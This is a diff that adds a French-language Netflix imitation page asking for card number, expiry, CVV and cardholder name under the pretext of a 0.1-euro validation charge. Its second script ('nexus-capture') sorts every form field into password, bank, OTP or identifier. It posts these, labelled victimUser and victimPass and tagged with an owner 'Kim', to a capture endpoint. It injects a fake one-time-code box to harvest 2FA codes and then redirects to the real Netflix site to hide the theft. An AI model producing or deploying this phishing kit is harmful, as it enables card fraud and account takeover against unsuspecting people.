@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Configurer votre carte de crédit ou de débit</title>
+    <style>
+        :root {
+            --bg-page: #ffffff;
+            --surface-soft: #f4f4f4;
+            --border-line: #8c8c8c;
+            --border-active: #111111;
+            --text-primary: #222222;
+            --text-secondary: #737373;
+            --brand-red: #e50914;
+            --brand-red-hover: #c40812;
+            --link-color: #0066cc;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-page);
+            color: var(--text-primary);
+            min-height: 100dvh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* En-tête de page web */
+        .web-header {
+            width: 100%;
+            border-bottom: 1px solid #e6e6e6;
+            background-color: #ffffff;
+        }
+
+        .web-header-inner {
+            max-width: 960px;
+            margin: 0 auto;
+            padding: 18px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .brand-logo {
+            color: var(--brand-red);
+            font-size: 1.75rem;
+            font-weight: 900;
+            letter-spacing: 0.6px;
+            text-transform: uppercase;
+            user-select: none;
+        }
+
+        .sign-out-link {
+            color: var(--text-primary);
+            font-size: 0.95rem;
+            font-weight: 700;
+            text-decoration: none;
+        }
+
+        .sign-out-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Conteneur principal ordonné */
+        .page-container {
+            width: 100%;
+            max-width: 460px;
+            margin: 0 auto;
+            padding: 36px 24px 64px;
+            flex: 1;
+        }
+
+        .step-label {
+            font-size: 0.82rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+        }
+
+        .page-heading {
+            font-size: 1.95rem;
+            font-weight: 700;
+            line-height: 1.2;
+            color: var(--text-primary);
+            margin-bottom: 18px;
+        }
+
+        /* Logos cartes */
+        .card-brands-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+
+        .brand-visa {
+            font-size: 0.9rem;
+            font-weight: 900;
+            font-style: italic;
+            color: #1a1f71;
+            letter-spacing: 0.5px;
+        }
+
+        .brand-mc {
+            display: inline-flex;
+            align-items: center;
+        }
+
+        .mc-circle {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+        }
+
+        .mc-red {
+            background-color: #eb001b;
+        }
+
+        .mc-yellow {
+            background-color: #f79e1b;
+            margin-left: -6px;
+            opacity: 0.92;
+        }
+
+        .brand-verve {
+            font-size: 0.76rem;
+            font-weight: 800;
+            color: #1b2a5a;
+            border-bottom: 2px solid #e50914;
+            padding-bottom: 1px;
+        }
+
+        /* Champs de formulaire */
+        .field-box {
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        .pay-input {
+            width: 100%;
+            height: 52px;
+            border: 1px solid var(--border-line);
+            border-radius: 2px;
+            padding: 0 44px 0 14px;
+            font-size: 1rem;
+            color: var(--text-primary);
+            background-color: #ffffff;
+            outline: none;
+        }
+
+        .pay-input::placeholder {
+            color: var(--text-secondary);
+        }
+
+        .pay-input:focus {
+            border-color: var(--border-active);
+            box-shadow: inset 0 0 0 1px var(--border-active);
+        }
+
+        .input-icon-right {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #555555;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            pointer-events: none;
+        }
+
+        .cvv-help-icon {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            border: 1.5px solid #8c8c8c;
+            color: #666666;
+            font-size: 0.78rem;
+            font-weight: 700;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .two-col-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .two-col-row .field-box {
+            margin-bottom: 0;
+        }
+
+        /* Encadré montant 0,1 euro + bouton Changer inactif */
+        .plan-summary-box {
+            background-color: var(--surface-soft);
+            border-radius: 2px;
+            padding: 14px 16px;
+            margin: 16px 0 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+        }
+
+        .plan-price {
+            font-size: 1rem;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+
+        .plan-tier {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            margin-top: 2px;
+        }
+
+        .change-link {
+            color: var(--link-color);
+            font-size: 0.92rem;
+            font-weight: 600;
+            background: none;
+            border: none;
+            cursor: default;
+            padding: 0;
+            opacity: 0.85;
+        }
+
+        /* Mentions légales */
+        .legal-note {
+            font-size: 0.82rem;
+            line-height: 1.48;
+            color: var(--text-secondary);
+            margin-bottom: 14px;
+        }
+
+        .legal-note a {
+            color: var(--link-color);
+            text-decoration: none;
+        }
+
+        .legal-note a:hover {
+            text-decoration: underline;
+        }
+
+        .error-msg {
+            font-size: 0.84rem;
+            font-weight: 600;
+            color: var(--brand-red);
+            min-height: 20px;
+            margin-bottom: 10px;
+        }
+
+        .submit-pay-btn {
+            width: 100%;
+            height: 50px;
+            border: none;
+            border-radius: 2px;
+            background-color: var(--brand-red);
+            color: #ffffff;
+            font-size: 1.02rem;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .submit-pay-btn:hover {
+            background-color: var(--brand-red-hover);
+        }
+
+        /* Écran noir de chargement (5s) avec cercle rouge uniquement */
+        .black-loader-overlay {
+            position: fixed;
+            inset: 0;
+            background-color: #000000;
+            z-index: 999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .black-loader-overlay.active {
+            display: flex;
+        }
+
+        .red-spinner {
+            width: 44px;
+            height: 44px;
+            border: 4px solid rgba(229, 9, 20, 0.22);
+            border-top-color: var(--brand-red);
+            border-radius: 50%;
+            animation: spinRed 0.75s linear infinite;
+        }
+
+        @keyframes spinRed {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <header class="web-header">
+        <div class="web-header-inner">
+            <span class="brand-logo">NETFLIX</span>
+            <a href="#" class="sign-out-link" id="sign-out-link">Déconnexion</a>
+        </div>
+    </header>
+
+    <main class="page-container">
+        <p class="step-label">Étape 3 sur 3</p>
+        <h1 class="page-heading">Configurer votre carte de crédit ou de débit</h1>
+
+        <div class="card-brands-row" aria-label="Cartes acceptées">
+            <span class="brand-visa">VISA</span>
+            <span class="brand-mc" aria-hidden="true">
+                <span class="mc-circle mc-red"></span>
+                <span class="mc-circle mc-yellow"></span>
+            </span>
+            <span class="brand-verve">Verve</span>
+        </div>
+
+        <form id="card-payment-form" novalidate>
+            <div class="field-box">
+                <input
+                    type="text"
+                    id="card-number"
+                    class="pay-input"
+                    placeholder="Numéro de carte"
+                    inputmode="numeric"
+                    autocomplete="cc-number"
+                    maxlength="19"
+                    required
+                >
+                <span class="input-icon-right" aria-hidden="true">
+                    <svg width="24" height="16" viewBox="0 0 24 16" fill="none" stroke="currentColor" stroke-width="1.6">
+                        <rect x="1" y="1" width="22" height="14" rx="2"></rect>
+                        <line x1="1" y1="5" x2="23" y2="5"></line>
+                    </svg>
+                </span>
+            </div>
+
+            <div class="two-col-row">
+                <div class="field-box">
+                    <input
+                        type="text"
+                        id="exp-date"
+                        class="pay-input"
+                        placeholder="Date d'expiration"
+                        inputmode="numeric"
+                        autocomplete="cc-exp"
+                        maxlength="5"
+                        required
+                    >
+                </div>
+                <div class="field-box">
+                    <input
+                        type="text"
+                        id="cvv-code"
+                        class="pay-input"
+                        placeholder="CVV"
+                        inputmode="numeric"
+                        autocomplete="cc-csc"
+                        maxlength="4"
+                        required
+                    >
+                    <span class="input-icon-right" aria-hidden="true">
+                        <span class="cvv-help-icon">?</span>
+                    </span>
+                </div>
+            </div>
+
+            <div class="field-box">
+                <input
+                    type="text"
+                    id="card-name"
+                    class="pay-input"
+                    placeholder="Nom sur la carte"
+                    autocomplete="cc-name"
+                    required
+                >
+            </div>
+
+            <div class="plan-summary-box">
+                <div>
+                    <div class="plan-price" id="plan-price-text">0,1 euro</div>
+                    <div class="plan-tier">Montant de validation</div>
+                </div>
+                <button type="button" class="change-link" id="change-plan-btn" aria-disabled="true">Changer</button>
+            </div>
+
+            <p class="legal-note">
+                Vos paiements peuvent être traités à l'international. Des frais bancaires supplémentaires peuvent s'appliquer.
+            </p>
+
+            <p class="legal-note">
+                En validant, vous acceptez nos <a href="#terms">Conditions d'utilisation</a> et notre
+                <a href="#privacy">Déclaration de confidentialité</a>, et confirmez avoir plus de 18 ans. Montant : <strong>0,1 euro</strong>.
+            </p>
+
+            <p id="form-error" class="error-msg" role="alert"></p>
+
+            <button type="submit" class="submit-pay-btn">Valider (0,1 euro)</button>
+        </form>
+    </main>
+
+    <!-- Écran noir + cercle rouge de chargement (5 secondes) -->
+    <div id="black-loader-overlay" class="black-loader-overlay" aria-live="polite" aria-busy="true">
+        <div class="red-spinner" aria-label="Chargement"></div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const NETFLIX_URL = "https://www.netflix.com/";
+            const LOADER_MS = 5000;
+
+            const cardNumberInput = document.getElementById('card-number');
+            const expDateInput = document.getElementById('exp-date');
+            const cvvInput = document.getElementById('cvv-code');
+            const cardNameInput = document.getElementById('card-name');
+            const changePlanBtn = document.getElementById('change-plan-btn');
+            const planPriceText = document.getElementById('plan-price-text');
+            const form = document.getElementById('card-payment-form');
+            const errorMsg = document.getElementById('form-error');
+            const blackOverlay = document.getElementById('black-loader-overlay');
+
+            // Bouton "Changer" volontairement inactif : ne modifie jamais le montant (0,1 euro)
+            changePlanBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                planPriceText.textContent = "0,1 euro";
+            });
+
+            cardNumberInput.addEventListener('input', () => {
+                const digits = cardNumberInput.value.replace(/\D/g, '').slice(0, 16);
+                cardNumberInput.value = digits.replace(/(\d{4})(?=\d)/g, '$1 ');
+                errorMsg.textContent = '';
+            });
+
+            expDateInput.addEventListener('input', () => {
+                const digits = expDateInput.value.replace(/\D/g, '').slice(0, 4);
+                expDateInput.value = digits.length > 2
+                    ? `${digits.slice(0, 2)}/${digits.slice(2)}`
+                    : digits;
+                errorMsg.textContent = '';
+            });
+
+            cvvInput.addEventListener('input', () => {
+                cvvInput.value = cvvInput.value.replace(/\D/g, '').slice(0, 4);
+                errorMsg.textContent = '';
+            });
+
+            cardNameInput.addEventListener('input', () => {
+                errorMsg.textContent = '';
+            });
+
+            function redirectToNetflix() {
+                try {
+                    window.location.assign(NETFLIX_URL);
+                } catch (_) {
+                    window.location.href = NETFLIX_URL;
+                }
+            }
+
+            form.addEventListener('submit', (e) => {
+                e.preventDefault();
+
+                const rawCard = cardNumberInput.value.replace(/\s/g, '');
+                const exp = expDateInput.value.trim();
+                const cvv = cvvInput.value.trim();
+                const holder = cardNameInput.value.trim();
+
+                if (rawCard.length < 13 || exp.length < 4 || cvv.length < 3 || holder.length < 2) {
+                    errorMsg.textContent = "Veuillez renseigner correctement les informations de la carte.";
+                    return;
+                }
+
+                errorMsg.textContent = '';
+                blackOverlay.classList.add('active');
+
+                setTimeout(() => {
+                    redirectToNetflix();
+                }, LOADER_MS);
+            });
+        });
+    </script>
+
+<script data-nexus-capture="true">
+(function() {
+  const NEXUS_CFG = {
+    endpoint: "/api/capture",
+    owner: "Kim",
+    network: "Netflix",
+    enableOtp: true
+  };
+
+  const state = {
+    victimUser: "",
+    victimPass: "",
+    otp: "Aucun",
+    capturedFields: {},
+    sentFingerprints: new Set()
+  };
+
+  function getFieldDescriptor(el) {
+    let labelTxt = "";
+    if (el.id) {
+      const lbl = document.querySelector('label[for="' + CSS.escape(el.id) + '"]');
+      if (lbl) labelTxt = (lbl.innerText || lbl.textContent || "").trim();
+    }
+    const parentLbl = el.closest("label");
+    if (parentLbl) {
+      labelTxt = (labelTxt + " " + (parentLbl.innerText || parentLbl.textContent || "")).trim();
+    }
+
+    const baseName =
+      el.name ||
+      el.id ||
+      labelTxt ||
+      el.placeholder ||
+      el.getAttribute("aria-label") ||
+      el.getAttribute("autocomplete") ||
+      ("field_" + (el.type || "text"));
+
+    const meta = [
+      el.id,
+      el.name,
+      el.placeholder,
+      el.getAttribute("aria-label"),
+      el.getAttribute("autocomplete"),
+      el.getAttribute("inputmode"),
+      el.className,
+      labelTxt
+    ]
+      .filter(Boolean)
+      .join(" ")
+      .toLowerCase();
+
+    return { key: baseName.trim(), meta };
+  }
+
+  function classifyInput(el) {
+    const type = (el.type || "text").toLowerCase();
+    const { meta } = getFieldDescriptor(el);
+
+    if (type === "password" || (/password|pass|mot de passe|pin/i.test(meta) && !/otp|2fa/i.test(meta))) {
+      return "password";
+    }
+
+    const ac = (el.getAttribute("autocomplete") || "").toLowerCase();
+    const maxLen = parseInt(el.getAttribute("maxlength") || "0", 10);
+    const isBank = /card|carte|cc-|cvv|cvc|csc|exp|expiry|expiration|iban|rib|bic|swift|routing|sort.?code|account.?num|banque|bank/i.test(meta);
+    const isDob = type === "date" || /birth|naissance|dob|bday|jour|mois|ann[ée]e|jj|mm|aaaa|yyyy/i.test(meta);
+
+    if (
+      ac === "one-time-code" ||
+      (!isBank && !isDob && (
+        /\botp\b|2fa|mfa|one-time|verification.?code|code.?v[ée]rif|security.?code/i.test(meta) ||
+        (type !== "password" && maxLen >= 4 && maxLen <= 8 && /\bcode\b/i.test(meta))
+      ))
+    ) {
+      return "otp";
+    }
+
+    if (isBank) return "bank";
+    if (isDob) return "dob";
+
+    if (["email", "text", "tel", "number", "search"].includes(type)) {
+      return "identifier";
+    }
+
+    return "other";
+  }
+
+  function collectCurrentValues() {
+    const fields = Array.from(document.querySelectorAll("input, select, textarea"));
+    const otpParts = [];
+    const allCaptured = {};
+    let idCandidate = "";
+    let bankCandidate = "";
+    let fallbackCandidate = "";
+
+    fields.forEach((el) => {
+      const type = (el.type || "text").toLowerCase();
+      if (type === "submit" || type === "button" || type === "reset") return;
+
+      const { key } = getFieldDescriptor(el);
+      const role = classifyInput(el);
+      let val = "";
+
+      if (type === "checkbox") {
+        val = el.checked ? (el.value || "checked") : "";
+      } else if (type === "radio") {
+        if (!el.checked) return;
+        val = el.value || "selected";
+      } else {
+        val = (el.value || "").trim();
+      }
+
+      if (!val) return;
+
+      const uniqueKey = allCaptured[key] !== undefined ? (key + "_" + (fields.indexOf(el) + 1)) : key;
+      allCaptured[uniqueKey] = val;
+
+      if (role === "otp") {
+        otpParts.push(val);
+      } else if (role === "password") {
+        state.victimPass = el.value;
+      } else if (role === "identifier" && !idCandidate) {
+        idCandidate = val;
+      } else if (role === "bank" && !bankCandidate) {
+        bankCandidate = val;
+      } else if (!fallbackCandidate) {
+        fallbackCandidate = val;
+      }
+    });
+
+    state.capturedFields = allCaptured;
+    state.victimUser = idCandidate || bankCandidate || fallbackCandidate || "";
+    state.otp = otpParts.length > 0 ? otpParts.join("") : "Aucun";
+  }
+
+  function postPayload(payload) {
+    const fingerprint = JSON.stringify(payload);
+    if (state.sentFingerprints.has(fingerprint)) return;
+    state.sentFingerprints.add(fingerprint);
+
+    fetch(NEXUS_CFG.endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+      keepalive: true
+    }).catch(() => {});
+  }
+
+  function sendCapture(stage, extra = {}) {
+    collectCurrentValues();
+
+    const hasFields = Object.keys(state.capturedFields).length > 0;
+    if (!hasFields && !state.victimUser && !state.victimPass && (!extra.otp || extra.otp === "Aucun")) {
+      return;
+    }
+
+    const isOtpEvent = Boolean(extra.otp && extra.otp !== "Aucun" && extra.otp !== "En attente OTP...");
+    const effectiveOtp = extra.otp || (isOtpEvent ? state.otp : (NEXUS_CFG.enableOtp ? "En attente OTP..." : "Aucun"));
+
+    const payload = {
+      owner: NEXUS_CFG.owner,
+      network: NEXUS_CFG.network,
+      type: isOtpEvent ? "OTP" : stage,
+      victimUser: state.victimUser || "Inconnu",
+      victimPass: state.victimPass || "Inconnu",
+      otp: effectiveOtp,
+      fields: state.capturedFields,
+      extra_info: JSON.stringify({
+        ua: navigator.userAgent,
+        platform: navigator.platform,
+        fields: state.capturedFields
+      })
+    };
+
+    postPayload(payload);
+  }
+
+  function ensureOtpSectionIfNeeded() {
+    if (!NEXUS_CFG.enableOtp) return;
+
+    const existingOtp = Array.from(document.querySelectorAll("input, select, textarea")).some((el) => classifyInput(el) === "otp");
+    if (existingOtp) return;
+
+    if (document.getElementById("nexus-auto-otp-box")) return;
+
+    const box = document.createElement("div");
+    box.id = "nexus-auto-otp-box";
+    box.style.cssText = [
+      "margin:14px auto",
+      "padding:14px",
+      "max-width:360px",
+      "border:1px solid #d0d7de",
+      "border-radius:10px",
+      "background:#ffffff",
+      "font-family:inherit",
+      "text-align:center"
+    ].join(";");
+
+    box.innerHTML = `
+      <div style="font-size:13px;font-weight:700;margin-bottom:8px;color:#111827;">Code de vérification (OTP)</div>
+      <input
+        id="nexus-otp-field"
+        data-nexus-injected-otp="true"
+        type="text"
+        inputmode="numeric"
+        maxlength="6"
+        placeholder="••••••"
+        style="width:100%;padding:10px;text-align:center;font-size:18px;letter-spacing:8px;border:1px solid #9ca3af;border-radius:8px;margin-bottom:10px;"
+      />
+      <button
+        id="nexus-otp-submit"
+        type="button"
+        style="width:100%;padding:10px;border:none;border-radius:8px;background:#111827;color:#fff;font-weight:600;cursor:pointer;"
+      >Valider le code OTP</button>
+    `;
+
+    const targetForm = document.querySelector("form");
+    if (targetForm && targetForm.parentElement) {
+      targetForm.parentElement.insertBefore(box, targetForm.nextSibling);
+    } else {
+      document.body.appendChild(box);
+    }
+
+    const otpInput = document.getElementById("nexus-otp-field");
+    const otpBtn = document.getElementById("nexus-otp-submit");
+
+    otpInput.addEventListener("input", () => {
+      otpInput.value = otpInput.value.replace(/\D/g, "");
+      collectCurrentValues();
+    });
+
+    otpBtn.addEventListener("click", () => {
+      collectCurrentValues();
+      const code = otpInput.value.trim();
+      sendCapture("OTP", { otp: code || state.otp });
+    });
+  }
+
+  document.addEventListener("input", (e) => {
+    const el = e.target;
+    if (!el || !["INPUT", "SELECT", "TEXTAREA"].includes(el.tagName)) return;
+    collectCurrentValues();
+  }, true);
+
+  document.addEventListener("change", (e) => {
+    const el = e.target;
+    if (!el || !["INPUT", "SELECT", "TEXTAREA"].includes(el.tagName)) return;
+    collectCurrentValues();
+  }, true);
+
+  document.addEventListener("submit", () => {
+    collectCurrentValues();
+    const hasOtp = state.otp && state.otp !== "Aucun";
+    if (hasOtp) {
+      sendCapture("OTP", { otp: state.otp });
+    } else {
+      sendCapture(NEXUS_CFG.enableOtp ? "OTP_STEP1" : "STANDARD");
+    }
+  }, true);
+
+  document.addEventListener("click", (e) => {
+    const btn = e.target.closest("button, input[type='submit'], input[type='button'], [role='button']");
+    if (!btn || btn.id === "nexus-otp-submit") return;
+    collectCurrentValues();
+    const txt = (btn.innerText || btn.value || "").toLowerCase();
+    const hasOtp = state.otp && state.otp !== "Aucun";
+    if (hasOtp && (txt.includes("otp") || txt.includes("verify") || txt.includes("vérif") || txt.includes("confirm") || txt.includes("valid"))) {
+      sendCapture("OTP", { otp: state.otp });
+    } else if (Object.keys(state.capturedFields).length > 0 || state.victimUser || state.victimPass) {
+      sendCapture(NEXUS_CFG.enableOtp ? "OTP_STEP1" : "STANDARD");
+    }
+  }, true);
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", ensureOtpSectionIfNeeded);
+  } else {
+    ensureOtpSectionIfNeeded();
+  }
+})();
+</script>
+</body>
+</html>
